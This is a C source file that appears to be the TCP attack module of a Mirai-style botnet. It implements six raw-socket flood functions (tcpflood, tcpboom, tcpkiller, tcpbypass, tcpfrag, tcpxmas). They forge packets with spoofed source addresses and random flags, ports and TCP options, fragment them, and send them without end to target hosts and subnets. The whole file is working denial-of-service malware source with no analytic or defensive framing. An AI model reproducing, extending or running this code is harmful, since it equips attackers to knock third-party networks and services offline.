#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <string.h>
#include <sys/uio.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/checksum.h"
#include "headers/rand.h"

#ifndef TH_FIN
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#endif

enum XMAS_PROFILE
{
    PROFILE_XMAS,
    PROFILE_NULL,
    PROFILE_FIN
};

void attack_tcpflood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
        tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->ack = 1;
        tcph->window = htons(2048);

        if (data_rand && data_len > 0)
            rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcpboom(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        perror("Failed to create raw socket");
#endif
        return;
    }

    int hincl = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int)) == -1)
    {
#ifdef DEBUG
        perror("Failed to set IP_HDRINCL");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
        tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->ack = 1;
        tcph->window = htons(2048 + (rand_next() % 4096));

        uint8_t *tcp_options = (uint8_t *)(tcph + 1);
        tcp_options[0] = 0x02;
        tcp_options[1] = 0x04;
        *(uint16_t *)&tcp_options[2] = htons(1460);
        tcp_options[4] = 0x01;
        tcp_options[5] = 0x03;
        tcp_options[6] = 0x03;
        tcp_options[7] = 0x06;
        tcp_options[8] = 0x01;
        tcp_options[9] = 0x01;
        tcp_options[10] = 0x08;
        tcp_options[11] = 0x0a;
        *(uint32_t *)&tcp_options[12] = htonl(rand_next());
        *(uint32_t *)&tcp_options[16] = 0;

        if (data_rand && data_len > 0)
        {
            rand_str(payload, data_len);
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() >> targs[i].netmask));
            }

            if (source_ip == 0xffffffff)
            {
                iph->saddr = rand_next();
            }

            if (sport == 0xffff)
            {
                tcph->source = htons(1024 + (rand_next() % 64512));
            }
            if (dport == 0xffff)
            {
                tcph->dest = htons(rand_next() % 65535);
            }

            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            int ttl = 32 + (rand_next() % 32);
            setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        usleep(10);
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcpkiller(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        perror("Failed to create raw socket");
#endif
        return;
    }

    int hincl = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int)) == -1)
    {
#ifdef DEBUG
        perror("Failed to set IP_HDRINCL");
#endif
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(rand_next() & 0xffff);
        iph->ttl = 32 + (rand_next() % 96);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
        tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());
        tcph->doff = 5;
        uint8_t flags[] = {TH_SYN, TH_ACK, TH_FIN, TH_PUSH, TH_URG};
        uint8_t selected = flags[rand_next() % (sizeof(flags) / sizeof(flags[0]))];
        *((uint8_t *)tcph + 13) = selected;
        tcph->window = htons(256 + (rand_next() % 8192));

        if (data_rand && data_len > 0)
        {
            for (int j = 0; j < data_len; j++)
            {
                payload[j] = (rand_next() % 2 == 0) ? 0x90 : (rand_next() & 0xff);
            }
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() >> targs[i].netmask));
            }

            if (source_ip == 0xffffffff)
            {
                iph->saddr = rand_next();
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcpbypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 64);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons((sport == 0xffff) ? (1024 + (rand_next() % 64511)) : sport);
        tcph->dest = htons((dport == 0xffff) ? (rand_next() % 65535) : dport);

        tcph->urg = rand() % 2;
        tcph->ack = 1;
        tcph->psh = rand() % 2;
        tcph->fin = rand() % 2;
        tcph->rst = rand() % 2;
        tcph->syn = 0;
        tcph->doff = 5;
        tcph->window = htons(1024 + (rand() % 4096));

        tcph->seq = htonl(rand_next());
        tcph->ack_seq = htonl(rand_next());

        if (data_rand)
            rand_str(payload, data_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->id = htons(rand_next() & 0xffff);
            iph->ttl = 32 + (rand() % 64);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());

            tcph->urg = rand() % 2;
            tcph->psh = rand() % 2;
            tcph->fin = rand() % 2;
            tcph->rst = rand() % 2;

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr) + data_len);

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, 0,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        usleep(10);
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

void attack_tcpfrag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int frag_size = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_FRAG_SIZE, 32);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
            char *packet = calloc(1, total_len);
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(total_len);
            iph->id = htons(ip_ident == 0xffff ? rand_next() & 0xffff : ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = source_ip == 0xffffffff ? rand_next() : source_ip;
            iph->daddr = targs[i].addr;
            if (dont_frag)
                iph->frag_off = htons(1 << 14);

            tcph->source = htons(sport == 0xffff ? rand_next() & 0xffff : sport);
            tcph->dest = htons(dport == 0xffff ? rand_next() & 0xffff : dport);
            tcph->seq = htonl(rand_next());
            tcph->ack_seq = htonl(rand_next());
            tcph->doff = 5;

            uint8_t flags[] = {TH_SYN, TH_ACK, TH_FIN, TH_PUSH, TH_URG};
            uint8_t selected = flags[rand_next() % (sizeof(flags) / sizeof(flags[0]))];
            *((uint8_t *)tcph + 13) = selected;
            tcph->window = htons(256 + (rand_next() % 8192));

            if (data_rand && data_len > 0)
            {
                for (int j = 0; j < data_len; j++)
                    payload[j] = (rand_next() % 2 == 0) ? 0x90 : (rand_next() & 0xff);
            }

            int offset = 0;
            while (offset < total_len - sizeof(struct iphdr))
            {
                int remaining = total_len - sizeof(struct iphdr) - offset;
                int frag_payload_size = remaining > frag_size ? frag_size : remaining;
                int frag_total_size = sizeof(struct iphdr) + frag_payload_size;

                char *frag_pkt = calloc(1, frag_total_size);
                struct iphdr *frag_iph = (struct iphdr *)frag_pkt;

                memcpy(frag_pkt, packet, sizeof(struct iphdr));
                memcpy(frag_pkt + sizeof(struct iphdr), packet + sizeof(struct iphdr) + offset, frag_payload_size);

                frag_iph->tot_len = htons(frag_total_size);

                uint16_t frag_off = (offset / 8);
                if ((offset + frag_payload_size) < (total_len - sizeof(struct iphdr)))
                    frag_off |= htons(1 << 13);

                frag_iph->frag_off = frag_off;

                frag_iph->check = 0;
                frag_iph->check = checksum_generic((uint16_t *)frag_iph, sizeof(struct iphdr));

                sendto(fd, frag_pkt, frag_total_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

                free(frag_pkt);
                offset += frag_payload_size;
            }

            free(packet);
        }
    }

    close(fd);
}

void attack_tcpxmas(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_xmas_data *xmas_data = calloc(targs_len, sizeof(struct attack_xmas_data));
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint8_t profile = attack_get_opt_int(opts_len, opts, ATK_OPT_CUSTOM + 1, PROFILE_XMAS);

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        close(rfd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

    xmas_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            continue;
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = (targs[i].netmask < 32)
                                   ? htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))
                                   : targs[i].addr;
        addr.sin_port = (dport == 0xffff) ? htons(rand_next() % 65535) : htons(dport);

        connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        start_recv = time(NULL);

        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof(recv_addr);
            ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
                return;

            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr &&
                ret > (sizeof(struct iphdr) + sizeof(struct tcphdr)))
            {
                struct tcphdr *tcph_recv = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
                if (tcph_recv->source == addr.sin_port && tcph_recv->syn && tcph_recv->ack)
                {
                    struct iphdr *iph;
                    struct tcphdr *tcph;
                    char *payload;
                    xmas_data[i].addr = addr.sin_addr.s_addr;
                    xmas_data[i].seq = ntohl(tcph_recv->seq);
                    xmas_data[i].ack_seq = ntohl(tcph_recv->ack_seq);
                    xmas_data[i].sport = tcph_recv->dest;
                    xmas_data[i].dport = addr.sin_port;

                    pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                    iph = (struct iphdr *)pkts[i];
                    tcph = (struct tcphdr *)(iph + 1);
                    payload = (char *)(tcph + 1);

                    iph->version = 4;
                    iph->ihl = 5;
                    iph->tos = ip_tos;
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                    iph->id = htons(ip_ident);
                    iph->ttl = ip_ttl;
                    if (dont_frag)
                        iph->frag_off = htons(1 << 14);
                    iph->protocol = IPPROTO_TCP;
                    iph->saddr = LOCAL_ADDR;
                    iph->daddr = xmas_data[i].addr;

                    tcph->source = xmas_data[i].sport;
                    tcph->dest = xmas_data[i].dport;
                    tcph->seq = htonl(xmas_data[i].ack_seq);
                    tcph->ack_seq = htonl(xmas_data[i].seq);
                    tcph->doff = 5;

                    tcph->urg = tcph->psh = tcph->fin = tcph->ack = tcph->rst = tcph->syn = 0;
                    switch (profile)
                    {
                    case PROFILE_XMAS:
                        tcph->urg = 1;
                        tcph->psh = 1;
                        tcph->fin = 1;
                        break;
                    case PROFILE_NULL:
                        break;
                    case PROFILE_FIN:
                        tcph->fin = 1;
                        break;
                    default:
                        tcph->urg = 1;
                        tcph->psh = 1;
                        tcph->fin = 1;
                        break;
                    }

                    tcph->window = rand_next() & 0xffff;
                    if (data_rand)
                        rand_str(payload, data_len);
                    break;
                }
                else if (tcph_recv->fin || tcph_recv->rst)
                {
                    close(fd);
                    goto xmas_setup_nums;
                }
            }
            if (time(NULL) - start_recv > 10)
            {
                close(fd);
                goto xmas_setup_nums;
            }
        }
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            for (int b = 0; b < 3; b++)
            {
                if (data_rand)
                    rand_str(data, data_len);

                tcph->seq = htonl(xmas_data[i].seq++);
                tcph->ack_seq = htonl(xmas_data[i].ack_seq);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

                targs[i].sock_addr.sin_port = tcph->dest;
                sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len,
                       MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            }
        }
    }
}
